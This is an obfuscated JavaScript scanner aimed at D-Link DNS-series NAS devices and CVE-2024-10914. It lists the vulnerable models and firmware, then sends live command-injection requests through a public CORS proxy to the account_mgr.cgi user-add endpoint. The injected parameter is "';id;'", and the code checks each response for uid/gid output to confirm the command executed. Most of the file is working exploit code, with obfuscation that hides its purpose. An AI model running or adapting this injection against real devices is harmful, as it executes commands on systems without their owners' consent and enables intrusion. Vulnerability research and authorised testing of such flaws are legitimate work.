const _0x337c7d=_0x2bde;(function(_0x29d377,_0x5c9902){const _0x13e37c=_0x2bde,_0x141af2=_0x29d377();while(!![]){try{const _0x38e0cb=-parseInt(_0x13e37c(0x131))/0x1*(parseInt(_0x13e37c(0x147))/0x2)+-parseInt(_0x13e37c(0x167))/0x3*(parseInt(_0x13e37c(0x12f))/0x4)+-parseInt(_0x13e37c(0x179))/0x5+parseInt(_0x13e37c(0x142))/0x6+-parseInt(_0x13e37c(0x15b))/0x7+-parseInt(_0x13e37c(0x17d))/0x8*(-parseInt(_0x13e37c(0x170))/0x9)+parseInt(_0x13e37c(0x16b))/0xa*(parseInt(_0x13e37c(0x162))/0xb);if(_0x38e0cb===_0x5c9902)break;else _0x141af2['push'](_0x141af2['shift']());}catch(_0x558328){_0x141af2['push'](_0x141af2['shift']());}}}(_0x4a15,0xec1c6));function _0x4a15(){const _0x293cdb=['cpe:2.3:a:dlink:dns-325_firmware:*:*:*:*:*:*:*:*','276772fEAcNS','lastModified','Error\x20clearing\x20target\x20history:','strict-transport-security','cpe:2.3:h:d-link:dns-320:*:*:*:*:*:*:*:*','toISOString','Server\x20response\x20time\x20is\x20slow\x20(','1.00','entries','uid=','cpe:2.3:o:dlink:dns-340l_firmware:*:*:*:*:*:*:*:*','includes','headers','name','securityHeaders','floor','exports','last-modified','status','location','3145352WxWozq','Error\x20occurred\x20during\x20check.','Error\x20saving\x20target\x20history:','Connection\x20timeout\x20occurred','XMLHttpRequest','1.08','\x20years)','35657512rqgfeE','1.4.25','Unknown','cpe:2.3:o:dlink:dns-320lw_firmware:*:*:*:*:*:*:*:*','*/*','22305gPdDNN','unshift','text','replace','10hwHYWW','message','Target\x20may\x20be\x20vulnerable\x20to\x20CVE-2024-10914','now','https://cors-anywhere.herokuapp.com/','29628lwQWzp','getItem','http://','error','cpe:2.3:a:dlink:dns-320lw_firmware:*:*:*:*:*:*:*:*','get','serverInfo','stringify','Warning:\x20Server\x20content\x20is\x20very\x20old\x20(','8262885HYvKsP','omit','removeItem','\x20years).\x20This\x20may\x20indicate\x20an\x20outdated\x20or\x20unmaintained\x20system.','1856McWYuk','content-security-policy','429','cpe:2.3:h:d-link:dns-320lw:*:*:*:*:*:*:*:*','abort','slice','Received\x20HTTP\x20429\x20(Too\x20Many\x20Requests).\x20This\x20is\x20caused\x20by\x20rate\x20limiting\x20from\x20the\x20proxy\x20or\x20target\x20server.\x20Please\x20wait\x20a\x20few\x20minutes,\x20reduce\x20scan\x20speed,\x20or\x20use\x20your\x20own\x20proxy\x20(e.g.,\x20deploy\x20your\x20own\x20CORS\x20Anywhere\x20instance).','setItem','x-frame-options','push','1.01','Medium','x-xss-protection','origin','Error\x20getting\x20target\x20history:','HEAD','Target\x20is\x20not\x20reachable','1.02','x-content-type-options','cpe:2.3:o:dlink:dns-320_firmware:*:*:*:*:*:*:*:*','Wait\x20a\x20few\x20minutes,\x20reduce\x20scan\x20speed,\x20or\x20use\x20your\x20own\x20proxy.','872VHJPMk','parse','1QQtkEQ','details','statusText','cpe:2.3:a:dlink:dns-320_firmware:*:*:*:*:*:*:*:*','cpe:2.3:o:dlink:dns-325_firmware:*:*:*:*:*:*:*:*','test','ms\x20average)','root','cpe:2.3:h:d-link:dns-325:*:*:*:*:*:*:*:*','cve_2024_10914_target_history','High','Error\x20during\x20scan:','Rate\x20limit\x20exceeded\x20(HTTP\x20429).','If\x20you\x20see\x20HTTP\x20429,\x20wait\x20a\x20few\x20minutes,\x20reduce\x20scan\x20speed,\x20or\x20use\x20your\x20own\x20proxy.','hostname','cpe:2.3:h:d-link:dns-340l:*:*:*:*:*:*:*:*','warnings','4937418LyUaIy','reduce','toLowerCase','1.4.25-devel'];_0x4a15=function(){return _0x293cdb;};return _0x4a15();}const PAYLOADS=['id',_0x337c7d(0x13f)],PROXY_URL=_0x337c7d(0x16f),VULNERABLE_DEVICES={'DNS-320':{'firmware':[_0x337c7d(0x14e)],'cpe':{'hardware':_0x337c7d(0x14b),'firmware':_0x337c7d(0x12d),'application':_0x337c7d(0x134)}},'DNS-320LW':{'firmware':['1.01.0914.2012'],'cpe':{'hardware':_0x337c7d(0x180),'firmware':_0x337c7d(0x165),'application':_0x337c7d(0x174)}},'DNS-325':{'firmware':[_0x337c7d(0x187),_0x337c7d(0x12b)],'cpe':{'hardware':_0x337c7d(0x139),'firmware':_0x337c7d(0x135),'application':_0x337c7d(0x146)}},'DNS-340L':{'firmware':[_0x337c7d(0x160)],'cpe':{'hardware':_0x337c7d(0x140),'firmware':_0x337c7d(0x151),'application':'cpe:2.3:a:dlink:dns-340l_firmware:*:*:*:*:*:*:*:*'}}},TARGET_HISTORY_KEY=_0x337c7d(0x13a),SERVER_SIGNATURES={'lighttpd':{'versions':[_0x337c7d(0x163),_0x337c7d(0x145)],'risk':_0x337c7d(0x188),'details':'Older\x20version\x20of\x20lighttpd\x20server\x20detected'}};function saveTargetHistory(_0x213d8c,_0xfe47e5){const _0x4f9f84=_0x337c7d;try{let _0x16db9c=JSON['parse'](localStorage[_0x4f9f84(0x171)](TARGET_HISTORY_KEY)||'[]');_0x16db9c[_0x4f9f84(0x168)]({'target':_0x213d8c,'result':_0xfe47e5,'timestamp':new Date()[_0x4f9f84(0x14c)]()}),_0x16db9c=_0x16db9c[_0x4f9f84(0x182)](0x0,0xa),localStorage[_0x4f9f84(0x184)](TARGET_HISTORY_KEY,JSON[_0x4f9f84(0x177)](_0x16db9c));}catch(_0x30a556){console[_0x4f9f84(0x173)](_0x4f9f84(0x15d),_0x30a556);}}function getTargetHistory(){const _0x223f00=_0x337c7d;try{return JSON[_0x223f00(0x130)](localStorage[_0x223f00(0x171)](TARGET_HISTORY_KEY)||'[]');}catch(_0x431c33){return console[_0x223f00(0x173)](_0x223f00(0x128),_0x431c33),[];}}function clearTargetHistory(){const _0x292a57=_0x337c7d;try{localStorage[_0x292a57(0x17b)](TARGET_HISTORY_KEY);}catch(_0x114b26){console[_0x292a57(0x173)](_0x292a57(0x149),_0x114b26);}}function checkLastModified(_0x5af641){const _0x14c3a1=_0x337c7d;if(!_0x5af641)return null;const _0x675a3b=new Date(_0x5af641),_0x3a6052=new Date(),_0x3f5681=(_0x3a6052-_0x675a3b)/(0x3e8*0x3c*0x3c*0x18*0x16d);if(_0x3f5681>0x5)return{'warning':!![],'message':_0x14c3a1(0x178)+Math[_0x14c3a1(0x156)](_0x3f5681)+_0x14c3a1(0x17c)};return null;}function _0x2bde(_0x54d59c,_0x1857f7){const _0x4a1582=_0x4a15();return _0x2bde=function(_0x2bde92,_0x9b45c4){_0x2bde92=_0x2bde92-0x127;let _0x9b3af8=_0x4a1582[_0x2bde92];return _0x9b3af8;},_0x2bde(_0x54d59c,_0x1857f7);}async function analyzeServerHeaders(_0xf45b02){const _0x5b7896=_0x337c7d,_0x60349a={'serverInfo':null,'lastModified':null,'securityHeaders':{},'warnings':[]},_0x2aebfb=_0xf45b02['get']('server');if(_0x2aebfb)for(const [_0x10c737,_0xdf562d]of Object[_0x5b7896(0x14f)](SERVER_SIGNATURES)){if(_0x2aebfb[_0x5b7896(0x144)]()[_0x5b7896(0x152)](_0x10c737[_0x5b7896(0x144)]())){_0x60349a[_0x5b7896(0x176)]={'type':_0x10c737,'version':_0x2aebfb,'risk':_0xdf562d['risk'],'details':_0xdf562d[_0x5b7896(0x132)]};break;}}const _0x239044=_0xf45b02[_0x5b7896(0x175)](_0x5b7896(0x158));if(_0x239044){const _0x433ec5=new Date(_0x239044),_0x44da39=new Date(),_0xd20a63=(_0x44da39-_0x433ec5)/(0x3e8*0x3c*0x3c*0x18*0x16d);_0x60349a[_0x5b7896(0x148)]={'date':_0x433ec5,'age':_0xd20a63,'warning':_0xd20a63>0x5},_0xd20a63>0x5&&_0x60349a[_0x5b7896(0x141)]['push']('Server\x20content\x20is\x20very\x20old\x20('+Math[_0x5b7896(0x156)](_0xd20a63)+_0x5b7896(0x161));}const _0x1c79dd=[_0x5b7896(0x185),_0x5b7896(0x12c),_0x5b7896(0x189),_0x5b7896(0x17e),_0x5b7896(0x14a)];return _0x1c79dd['forEach'](_0x1c70a1=>{const _0x48844d=_0x5b7896;_0x60349a[_0x48844d(0x155)][_0x1c70a1]=_0xf45b02[_0x48844d(0x175)](_0x1c70a1)?'Present':'Missing';}),_0x60349a;}async function checkVulnerability(_0x17ee2b,_0x2e17cc=0x50){const _0x32f8e9=_0x337c7d;try{const _0x1f3585=_0x17ee2b[_0x32f8e9(0x16a)](/^https?:\/\//,'');let _0x194782=![],_0x2d9fcb=0x0,_0x5a97ca=0x0,_0x1d5547=0x0,_0x3e83b6=null,_0x112061=[],_0x307334=![],_0x371e36='';try{const _0x2162a9=performance[_0x32f8e9(0x16e)](),_0x538996=PROXY_URL+'http://'+_0x1f3585+':'+_0x2e17cc+'/',_0x446147=await fetch(_0x538996,{'method':_0x32f8e9(0x129),'headers':{'User-Agent':'Mozilla/5.0\x20(Linux;\x20Android\x2010;\x20SM-G960U)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/88.0.4324.181\x20Mobile\x20Safari/537.36','Origin':window[_0x32f8e9(0x15a)][_0x32f8e9(0x127)],'X-Requested-With':'XMLHttpRequest'},'timeout':0x2710}),_0x2eef56=performance[_0x32f8e9(0x16e)]();_0x112061[_0x32f8e9(0x186)](_0x2eef56-_0x2162a9);if(_0x446147[_0x32f8e9(0x159)]===0x1ad){_0x307334=!![],_0x371e36=_0x32f8e9(0x183);throw new Error(_0x371e36);}if(!_0x446147['ok']){const _0x55dd59={'vulnerable':![],'details':_0x32f8e9(0x12a),'confidence':_0x32f8e9(0x13b),'evidence':{'status':_0x446147[_0x32f8e9(0x159)],'statusText':_0x446147[_0x32f8e9(0x133)]}};return saveTargetHistory(_0x1f3585+':'+_0x2e17cc,_0x55dd59),_0x55dd59;}_0x3e83b6=await analyzeServerHeaders(_0x446147[_0x32f8e9(0x153)]);}catch(_0x4a6d7f){const _0x268cfb={'vulnerable':![],'details':_0x4a6d7f[_0x32f8e9(0x16c)]||_0x32f8e9(0x12a),'confidence':_0x32f8e9(0x13b),'evidence':{'error':_0x4a6d7f['message']}};return saveTargetHistory(_0x1f3585+':'+_0x2e17cc,_0x268cfb),_0x268cfb;}for(const _0x49ec19 of PAYLOADS){const _0x128f89=performance['now'](),_0x26dde4=PROXY_URL+_0x32f8e9(0x172)+_0x1f3585+':'+_0x2e17cc+'/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=\x27;'+_0x49ec19+';\x27';try{const _0x4d5226=new AbortController(),_0x255d34=setTimeout(()=>_0x4d5226[_0x32f8e9(0x181)](),0x2710),_0x15d04a=await fetch(_0x26dde4,{'method':'GET','headers':{'Accept':_0x32f8e9(0x166),'User-Agent':'Mozilla/5.0\x20(Linux;\x20Android\x2010;\x20SM-G960U)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/88.0.4324.181\x20Mobile\x20Safari/537.36','X-Requested-With':_0x32f8e9(0x15f),'Origin':window[_0x32f8e9(0x15a)][_0x32f8e9(0x127)]},'signal':_0x4d5226['signal'],'credentials':_0x32f8e9(0x17a)}),_0x2bd5d3=performance[_0x32f8e9(0x16e)]();_0x112061[_0x32f8e9(0x186)](_0x2bd5d3-_0x128f89),clearTimeout(_0x255d34);if(_0x15d04a['status']===0x1ad){_0x307334=!![],_0x371e36=_0x32f8e9(0x183);throw new Error(_0x371e36);}if(_0x15d04a[_0x32f8e9(0x159)]===0xc8){const _0x5ee4b0=await _0x15d04a[_0x32f8e9(0x169)]();/uid=\d+\(\w+\).*gid=\d+\(\w+\)/[_0x32f8e9(0x136)](_0x5ee4b0)&&_0x2d9fcb++,(_0x5ee4b0[_0x32f8e9(0x152)](_0x49ec19)||_0x5ee4b0[_0x32f8e9(0x152)](_0x32f8e9(0x150))||_0x5ee4b0['includes'](_0x32f8e9(0x138)))&&_0x1d5547++;}}catch(_0x53fdc4){if(_0x307334||_0x53fdc4[_0x32f8e9(0x16c)]&&_0x53fdc4[_0x32f8e9(0x16c)][_0x32f8e9(0x152)](_0x32f8e9(0x17f))){const _0x282c38={'vulnerable':![],'details':_0x371e36||_0x32f8e9(0x13d),'confidence':_0x32f8e9(0x164),'evidence':{'error':_0x53fdc4['message'],'suggestion':_0x32f8e9(0x12e)}};return saveTargetHistory(_0x1f3585+':'+_0x2e17cc,_0x282c38),_0x282c38;}_0x53fdc4[_0x32f8e9(0x154)]==='AbortError'?_0x194782=!![]:console[_0x32f8e9(0x173)](_0x32f8e9(0x13c),_0x53fdc4);}await new Promise(_0x3cf031=>setTimeout(_0x3cf031,0x1f4));}const _0x36ea81=_0x112061[_0x32f8e9(0x143)]((_0xf06c01,_0x92dfb5)=>_0xf06c01+_0x92dfb5,0x0)/_0x112061['length'],_0x1b5da0=_0x36ea81>0x3e8?{'warning':!![],'message':_0x32f8e9(0x14d)+Math['round'](_0x36ea81)+_0x32f8e9(0x137)}:null;let _0x16b251;if(_0x2d9fcb>0x0)_0x16b251={'vulnerable':!![],'details':'Target\x20is\x20vulnerable\x20to\x20CVE-2024-10914','confidence':_0x32f8e9(0x13b),'evidence':{'successfulResponses':_0x2d9fcb,'suspiciousResponses':_0x1d5547,'errorResponses':_0x5a97ca,'serverAnalysis':_0x3e83b6,'performanceWarning':_0x1b5da0}};else{if(_0x1d5547>0x0)_0x16b251={'vulnerable':!![],'details':_0x32f8e9(0x16d),'confidence':_0x32f8e9(0x188),'evidence':{'successfulResponses':_0x2d9fcb,'suspiciousResponses':_0x1d5547,'errorResponses':_0x5a97ca,'serverAnalysis':_0x3e83b6,'performanceWarning':_0x1b5da0}};else _0x194782?_0x16b251={'vulnerable':![],'details':_0x32f8e9(0x15e),'confidence':'Medium','evidence':{'hasConnectionError':!![],'serverAnalysis':_0x3e83b6,'performanceWarning':_0x1b5da0}}:_0x16b251={'vulnerable':![],'details':'Target\x20is\x20not\x20vulnerable\x20to\x20CVE-2024-10914','confidence':_0x32f8e9(0x13b),'evidence':{'successfulResponses':_0x2d9fcb,'suspiciousResponses':_0x1d5547,'errorResponses':_0x5a97ca,'serverAnalysis':_0x3e83b6,'performanceWarning':_0x1b5da0}};}return saveTargetHistory(_0x1f3585+':'+_0x2e17cc,_0x16b251),_0x16b251;}catch(_0xddca02){const _0xfc2516={'vulnerable':![],'details':_0xddca02['message']||_0x32f8e9(0x15c),'confidence':'Unknown','evidence':{'error':_0xddca02[_0x32f8e9(0x16c)],'suggestion':_0x32f8e9(0x13e)}};return saveTargetHistory(_0x17ee2b,_0xfc2516),_0xfc2516;}}typeof module!=='undefined'&&module[_0x337c7d(0x157)]&&(module['exports']={'checkVulnerability':checkVulnerability,'VULNERABLE_DEVICES':VULNERABLE_DEVICES,'getTargetHistory':getTargetHistory,'clearTargetHistory':clearTargetHistory});
